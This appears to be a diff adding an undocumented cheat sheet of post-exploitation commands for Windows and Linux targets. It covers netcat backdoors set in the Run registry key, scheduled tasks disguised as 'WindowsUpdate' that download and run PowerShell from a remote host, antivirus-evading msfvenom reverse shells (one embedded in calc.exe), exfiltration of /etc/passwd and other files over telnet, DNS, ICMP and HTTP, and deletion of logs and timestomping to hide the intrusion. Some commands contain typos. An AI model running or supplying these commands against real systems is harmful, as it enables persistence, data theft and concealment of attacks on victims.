@@ -1,0 +1,40 @@
+
+meterpreter> upload/usr/share/windows-binaries/nc.exe C:\\windows\system32  
+meterpreter>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 8888 -e cmd.exe'
+meterpreter> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+C:\Windows\system32>netsh advfirewall firewall add rule name="svchostpassthrough" dir=in action=allow protocol=TCP localport=8888
+C:\windows\system32>netsh advfirewall firewall show rule name="svchostpassthrough"
+meterpreter> reboot  
+C:\windows\system32> shutdown /r /t 15  
+root@kali:~# cryptcat -k password -l -p 444 
+C:\cryptcat -k password <listener IP address> 444 
+schtasks /create /tn WindowsUpdate /tr "c:\windows\system32\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.0.109:8080/'''))'" /sc onlogon /ru System  
+schtasks /create /tn WindowsUPdate /tr "c:\windows\system32\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.0.109:8080/'''))'" /sc onstart /ru System
+schtasks /create /tn WindowsUPdate /tr "c:\windows\system32\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.0.109:8080/'''))'" /sc onidle /i 30
+run persistence -h
+meterpreter>run multi_console_command -rc   /root/.msf4/logs/persistence/VICTIM_20170610.4514/VICTIM_20170610.4514.rc  
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcplhost=192.168.0.24 lport=443 -e x86/shikata_ga_nai -i 5 -f exe -o attack1.exe  
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcplhost=192.168.0.24 lport=443 -e x86/shikata_ga_nai -i 8 raw |  msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o multiencoded.exe
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcplhost=192.168.0.24 lport=443 -x /root/calc.exe -k -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o calc.exe  
+nc -lvp 2323 >Exfilteredfile
+cat /etc/passwd | telnet remoteIP 2323
+git clone https://github.com/m57/dnsteal/
+cd dnsteal
+python dnsteal.py 192.168.1.104 -z -s 4 -b 57 -f 17  
+f=List.txt; s=4;b=57;c=0; for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig @192.168.1.104 `echo -ne $r$f|tr "+""*"` +short; done
+tcpdump -i eth0 'icmp and src host 192.168.1.104' -w importantfile.pcap  
+tshark -n -q -r importantfile.pcap -T fields -e data.data | tr -d "\n" | tr -d ":" >> extfilterated_hex.txt
+python
+        f=open('exfiltrated_hex.txt','r') 
+        hex_data=f.read() 
+        ascii_data=hex_data.decode('hex') 
+        print ascii_data 
+git clone https://github.com/sensepost/DET.git
+cd DET
+pip install -r requirements.txt
+ptyhon det.py  
+python det.py -c ./config-sample.json -p icmp -L
+powershell.exe -noprofile -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {true}; $http = new-object System.Net.WebClient; $response = $http.UploadFile("""http://192.168.0.109/upload.php""","""C:\users\eisc\Desktop\Secret.txt""");"  
+C:\ del %WINDIR%\*.log /a/s/q/f  
+meterpreter >timestomp -z "01/01/2001 10:10:10" README.txt  
+meterpreter>timestompC:\\ -r  
